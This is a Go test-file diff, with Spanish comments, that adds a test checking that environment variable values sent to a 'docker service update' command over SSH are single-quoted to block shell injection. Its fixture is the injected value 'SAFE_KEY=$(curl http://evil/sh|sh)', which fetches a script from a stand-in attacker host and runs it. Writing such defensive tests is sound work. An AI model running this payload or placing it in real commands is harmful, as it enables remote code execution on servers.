@@ -3,6 +3,7 @@ package usecases
 import (
 	"os"
 	"path/filepath"
+	"strings"
 	"testing"
 
 	"github.com/Dall06/tarhiata-ops/srv/sys/domain"
@@ -81,5 +82,29 @@ func TestManageEnvVarsUseCase_UpdateAndGet(t *testing.T) {
 	}
 	if updatedData.Map["PORT"] != "3000" || updatedData.Map["NODE_ENV"] != "production" {
 		t.Errorf("env vars not updated correctly: %v", updatedData.Map)
+	}
+}
+
+// TestManageEnvVarsUseCase_ShellInjectionPrevention valida el flujo completo: un valor
+// con metacaracteres de shell debe llegar citado al "docker service update" real (no solo
+// con comillas dobles escapadas, que $(...) / backticks siguen expandiendo dentro de
+// ellas), y una key con formato inválido debe omitirse en vez de interpolarse cruda.
+func TestManageEnvVarsUseCase_ShellInjectionPrevention(t *testing.T) {
+	repo := mocks.NewMockConfigRepository()
+	mockSSH := mocks.NewMockSSHExecutor()
+	uc := NewManageEnvVarsUseCase(repo, mockSSH)
+
+	rawEnv := "SAFE_KEY=$(curl http://evil/sh|sh)\n"
+	if err := uc.UpdateEnvVars("web-api", rawEnv, domain.ServerConfig{Host: "1.2.3.4"}); err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+
+	var got string
+	for _, c := range mockSSH.CommandsExecuted {
+		got = c
+	}
+	want := "--env-add 'SAFE_KEY=$(curl http://evil/sh|sh)'"
+	if !strings.Contains(got, want) {
+		t.Errorf("comando inseguro, falta citar el valor:\n got:  %s\n want fragment: %s", got, want)
 	}
 }
